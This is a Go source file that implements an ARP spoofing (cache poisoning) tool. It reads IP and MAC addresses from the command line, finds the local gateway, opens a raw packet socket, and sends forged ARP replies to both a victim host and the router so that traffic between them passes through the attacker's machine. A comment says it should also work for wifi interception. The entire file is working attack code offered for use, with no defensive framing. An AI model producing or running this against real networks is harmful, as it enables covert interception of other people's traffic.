package main

import (
	"log"
	"net"
	"syscall"
	"os"
	"fmt"
	"bytes"
	"github.com/jackpal/gateway"
	"github.com/mostlygeek/arp"
)

//in charge of getting the arguments and turning them into byte arrays
//maybe return the err instead of calling err!=nil here
func parse() [][]byte {
	args := os.Args
	if (len(args) != 5) {
		fmt.Println("Incorrect number of arguments, the structure must be: <IPv4-src><MAC-src><IPv4-target><MAC-target>, Ip format: x.x.x.x (decimal), Mac format: xx:xx:xx:xx:xx:xx (hex)")
		os.Exit(1)
	}
	bisliceB := make([][]byte, 6, 6)
	var introduce []byte
	var err error
	for i, v := range(args[1:]) {
		if i % 2 == 0 {
			introduce = net.ParseIP(v)
			if introduce == nil {
				fmt.Printf("Invalid IP: %s\n", v)
				os.Exit(1)
			}
			introduce = net.IP(introduce).To4()
		} else {
			introduce, err = net.ParseMAC(v)
			if err != nil {
				log.Fatal(err)
			}
		}
		bisliceB[i] = introduce
	}
	return bisliceB
}

func addGateway(args [][]byte) {
	gateIp, err := gateway.DiscoverGateway()
	if err != nil {
		log.Fatal(err)
	}
	gateMACStr := arp.Search(gateIp.String())
	gateMAC, err := net.ParseMAC(gateMACStr)
	if err != nil {
		log.Fatal(err)
	}
	args[4] = gateIp
	args[5] = gateMAC
}

//this will be the function called from the big main when joining both parts
func sendPacket(fd int, packet []byte, address *syscall.SockaddrLinklayer) {
	err := syscall.Sendto(fd, packet, 0, address)
	if err != nil {
		log.Fatal("Error sending arp packet: ", err)
	}
}

func getInterface(srcMAC []byte) (*net.Interface, error) {
	allInterfaces, err := net.Interfaces()
	if err != nil {
		return nil, err
	}
	for _, v := range(allInterfaces) {
		if bytes.Equal(v.HardwareAddr, srcMAC) {
			return &v, nil
		}
	}
	return nil, fmt.Errorf("Network interface not found for given MAC-src")
}

func main() {
	var err error
	args := parse()
	addGateway(args)
	fd, err := syscall.Socket(syscall.AF_PACKET, syscall.SOCK_RAW, syscall.IPPROTO_RAW)
	if err != nil {
		log.Fatal(err)
	}
	inter, err := getInterface(args[1])
	if err != nil {
		log.Fatal(err)
	}
	addr := syscall.SockaddrLinklayer {
		Ifindex: inter.Index,
	}
	sendPacket(fd, pkt_for_victim(args[4], args[1], args[2], args[3]), &addr)
	sendPacket(fd, pkt_for_router(args[0], args[1], args[4], args[5]), &addr)
}

//make it available for wifi interception too
func pkt_for_victim(routerIp, sourceMac, targetIp, targetMac []byte) []byte {
	base_pack := []byte {
		0x08, //type (arp)
		0x06,
		0x00, //ethernet
		0x01,
		0x08, //IP type
		0x00,
		0x06, //mac len
		0x04, //IP len
		0x00, //operation(response)
		0x02,
	}
	pack := make([]byte, 0, 42)
	pack = append(pack, targetMac...)
	pack = append(pack, sourceMac...)
	pack = append(pack, base_pack...)
	pack = append(pack, sourceMac...)
	pack = append(pack, routerIp...)
	pack = append(pack, targetMac...)
	pack = append(pack, targetIp...)
	return pack
}

//maybe before send this to router we need to send ping packet so that router has our arp address in its table
func pkt_for_router(targetIp, sourceMac, routerIp, routerMac []byte) []byte {
	base_pack := []byte {
		0x08, //type (arp)
		0x06,
		0x00, //ethernet
		0x01,
		0x08, //IP type
		0x00,
		0x06, //mac len
		0x04, //IP len
		0x00, //operation(response)
		0x02,
	}
	pack := make([]byte, 0, 42)
	pack = append(pack, routerMac...)
	pack = append(pack, sourceMac...)
	pack = append(pack, base_pack...)
	pack = append(pack, sourceMac...)
	pack = append(pack, targetIp...)
	pack = append(pack, routerMac...)
	pack = append(pack, routerIp...)
	return pack
}
